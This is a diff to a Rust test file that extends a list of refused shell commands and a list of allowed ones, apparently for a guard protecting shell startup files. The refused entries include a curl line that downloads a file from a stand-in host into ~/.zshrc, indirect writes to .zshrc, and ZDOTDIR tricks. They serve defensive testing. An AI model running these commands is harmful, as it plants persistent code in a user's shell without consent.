@@ -46,6 +46,11 @@ const REFUSED: &[&str] = &[
     "ZDOTDIR=/tmp/z zsh -i -c true",
     "direnv allow",
     "tar -xf payload.tar -C ~",
+    // Review round one.
+    "cd ~; echo x > \"$DEST\"",
+    "p=~/.zshrc; echo x > \"$p\"; p=notes",
+    "curl -s -o$HOME/.zshrc https://example.invalid/x",
+    "ZDOTDIR=/tmp/z zsh +f -c true",
 ];
 
 /// Reads and ordinary work stay allowed.
@@ -59,6 +64,8 @@ const ALLOWED: &[&str] = &[
     "echo x > build/$NAME",
     "sh -c 'echo hi'",
     "cargo build",
+    "rg --no-config alias ~/.zshrc",
+    "sed -n 1,20p ~/.zshrc",
 ];
 
 #[test]
